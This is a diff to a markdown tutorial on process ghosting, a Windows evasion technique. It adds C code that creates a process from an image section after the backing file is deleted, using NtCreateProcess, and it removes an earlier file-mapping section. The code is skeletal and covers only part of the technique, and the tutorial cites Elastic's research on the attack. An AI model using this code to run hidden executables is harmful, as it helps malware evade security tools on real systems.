@@ -241,38 +241,11 @@ HANDLE fetch_sections(HANDLE hfile, unsigned char * f_bytes, DWORD f_size) {
 }
 ```
 
-### Mapping FIles
-
-Now, we need to create a file mapping with the [CreateFileMappingA](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga) function for the target file. Once created, we map the target file mapping into the address space of a calling process.
-
-The skeletal code for this would look as such:
-
-```c
-LPVOID get_loaded_addr(HANDLE hfile, DWORD f_size) {
-	LPVOID base_addr;
-	ULARGE_INTEGER mapping_size;
-	
-	mapping_size.QuadPart = f_size;
-	
-	// Create file mapping
-	HANDLE hmap = CreateFileMappingA(hfile, NULL, PAGE_READONLY, 0, 0, NULL);
-	
-	// Get Address of loaded section
-	base_addr = MapViewOfFile(hmap, FILE_MAP_READ, 0, 0, mapping_size.LowPart);
-	
-	return base_addr;
-}
-```
-
-Once the file has been successfully mapped, we return the base address of the memory location where the file is mapped. You can verify this by inspecting the address and seeing the `5A 4D` magic bytes.
-
-![](./img/map_addr.png)
-
 ### Getting Entry Point
 
 ![](https://www.researchgate.net/publication/322350142/figure/fig1/AS:866935558389760@1583704952167/A-general-layout-of-PE-file-depicting-members-of-the-PE-Header-and-PE-Optional-Header.ppm)
 
-With the base address of the mapped image, we map it to the `Portable Executable` format and fetch a pointer to a `NT Header` structure.
+Next up, we map the file bytes to the `Portable Executable` format and fetch a pointer to a `NT Header` structure.
 
 From that, we get the Address of the PE's entrypoint  stored in the optional header.
 
@@ -283,8 +256,29 @@ DWORD get_ep_rva(LPVOID * base_addr) {
 }
 ```
 
-Once we have the entrypoint address,
+Once we have the entrypoint address, we  can free the bytes as they are no longer needed, as well as the handle to the target file is closed, thereby deleting it!
 
+### Spawn A Child Process
+Now that we our section handle, we need to create a child process with the Section handle.
+
+```c
+PCP_INFO create_cp(HANDLE hsection) {
+	DWORD retlen = 0;
+	CP_INFO * p_info = (PCP_INFO)malloc(sizeof(CP_INFO));
+	RtlZeroMemory(p_info, sizeof(CP_INFO));
+
+	NTSTATUS _status = NtCreateProcess(&(p_info->p_handle), PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), TRUE, hsection, NULL, NULL);
+
+	_status = NtQueryInformationProcess(p_info->p_handle, ProcessBasicInformation, &(p_info->pb_info), sizeof(PROCESS_BASIC_INFORMATION), NULL);
+
+	printf("> Process ID: %d\n", GetProcessId(p_info->p_handle));
+
+return p_info;
+
+}
+```
+
+Here,  create a process using the [NtCreateProcess()](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FProcess%2FNtCreateProcess.html) function and the section handle./
 
 ## References
 - https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack
